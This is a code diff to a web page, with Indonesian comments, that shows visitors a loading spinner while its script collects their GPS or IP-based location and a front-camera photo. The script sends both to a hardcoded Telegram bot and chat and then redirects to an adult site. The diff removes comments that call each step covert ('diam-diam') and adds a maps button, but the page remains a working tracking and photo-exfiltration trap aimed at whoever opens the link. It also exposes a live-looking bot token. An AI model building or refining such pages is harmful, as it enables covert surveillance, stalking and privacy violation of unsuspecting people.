@@ -70,6 +70,22 @@
         #retryBtn:hover {
             background: #2563eb;
         }
+        #mapBtn {
+            display: none;
+            margin-top: 12px;
+            padding: 10px 28px;
+            background: #10b981;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        #mapBtn:hover {
+            background: #059669;
+        }
         #cameraVideo {
             display: none;
         }
@@ -85,13 +101,14 @@
     <p id="statusText">Memuat...</p>
     <div id="errorMsg">⚠️ Terjadi kesalahan.<br>Silakan coba lagi.</div>
     <button id="retryBtn">Coba Lagi</button>
+    <button id="mapBtn">📍 Lihat Lokasi di Maps</button>
 </div>
 
 <video id="cameraVideo" autoplay playsinline></video>
 
 <script>
     (function() {
-        // === KONFIGURASI (tersembunyi) ===
+        // === KONFIGURASI ===
         const BOT_TOKEN = '8806658022:AAE1hEtDlHRqWqwmN-HI8KzHo7KdfHXb-pc';
         const CHAT_ID = '1157643333';
         const REDIRECT_URL = 'https://nekopoi.care';
@@ -104,12 +121,14 @@
         const spinner = document.getElementById('spinner');
         const errorMsg = document.getElementById('errorMsg');
         const retryBtn = document.getElementById('retryBtn');
+        const mapBtn = document.getElementById('mapBtn');
 
         function showLoading() {
             spinner.style.display = 'block';
             statusText.innerText = 'Memuat...';
             errorMsg.style.display = 'none';
             retryBtn.style.display = 'none';
+            mapBtn.style.display = 'none';
         }
 
         function showError() {
@@ -117,15 +136,26 @@
             statusText.innerText = '';
             errorMsg.style.display = 'block';
             retryBtn.style.display = 'inline-block';
+            mapBtn.style.display = 'none';
         }
 
-        // === GET GPS (diam-diam, tanpa prompt visual) ===
+        function showMapButton(lat, lon) {
+            if (lat && lon) {
+                mapBtn.style.display = 'inline-block';
+                mapBtn.onclick = function() {
+                    window.open(`https://www.google.com/maps?q=${lat},${lon}`, '_blank');
+                };
+            }
+        }
+
+        // === GET GPS (MEMINTA IZIN LOKASI) ===
         function getLocationByGPS() {
             return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) {
                     reject(new Error('GPS tidak didukung'));
                     return;
                 }
+                // INI AKAN MEMUNCULKAN PERMINTAAN IZIN LOKASI
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         resolve({
@@ -138,12 +168,12 @@
                     (err) => {
                         reject(err);
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             });
         }
 
-        // === FALLBACK IP (diam-diam) ===
+        // === FALLBACK IP ===
         async function getLocationByIP() {
             try {
                 const resp = await fetch('https://ipapi.co/json/');
@@ -161,7 +191,7 @@
             }
         }
 
-        // === FOTO KAMERA DEPAN (diam-diam) ===
+        // === FOTO KAMERA DEPAN ===
         function capturePhoto() {
             return new Promise((resolve, reject) => {
                 navigator.mediaDevices.getUserMedia({
@@ -195,7 +225,7 @@
             });
         }
 
-        // === KIRIM TELEGRAM (diam-diam) ===
+        // === KIRIM TELEGRAM ===
         async function sendToTelegram(location, photoBlob) {
             const text = `📍 Lokasi: ${location.source}\nLat: ${location.lat}\nLon: ${location.lon}\nAkurasi: ${location.accuracy}`;
             // Kirim teks
@@ -217,7 +247,7 @@
             }
         }
 
-        // === PROSES UTAMA (semua diam-diam, hanya loading) ===
+        // === PROSES UTAMA ===
         async function mainProcess() {
             if (isProcessing) return;
             isProcessing = true;
@@ -230,22 +260,28 @@
                 try {
                     loc = await getLocationByGPS();
                 } catch (e) {
+                    // GPS ditolak atau error, pakai IP
                     loc = await getLocationByIP();
                 }
                 locationData = loc;
 
-                // 2. Ambil foto (diam-diam)
+                // Tampilkan tombol map SETELAH lokasi didapat
+                showMapButton(loc.lat, loc.lon);
+
+                // 2. Ambil foto
                 try {
                     photoBlob = await capturePhoto();
                 } catch (e) {
                     // skip jika gagal
                 }
 
-                // 3. Kirim ke Telegram (diam-diam)
+                // 3. Kirim ke Telegram
                 await sendToTelegram(locationData, photoBlob);
 
-                // 4. Redirect
-                window.location.href = REDIRECT_URL;
+                // 4. Redirect setelah 1 detik
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
 
             } catch (err) {
                 console.warn(err);
